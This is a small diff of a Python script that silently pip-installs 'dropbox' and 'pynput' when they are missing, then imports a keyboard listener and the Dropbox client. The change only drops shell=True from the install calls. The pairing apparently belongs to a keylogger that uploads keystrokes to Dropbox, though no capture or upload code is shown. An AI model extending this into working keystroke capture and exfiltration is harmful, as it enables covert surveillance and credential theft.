@@ -7,9 +7,9 @@ try:
     import dropbox
 except ModuleNotFoundError:
     subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
-        'dropbox'], shell=True)
+        'dropbox'])
     subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
-        'pynput'], shell=True)
+        'pynput'])
     from pynput import keyboard
     import dropbox
 
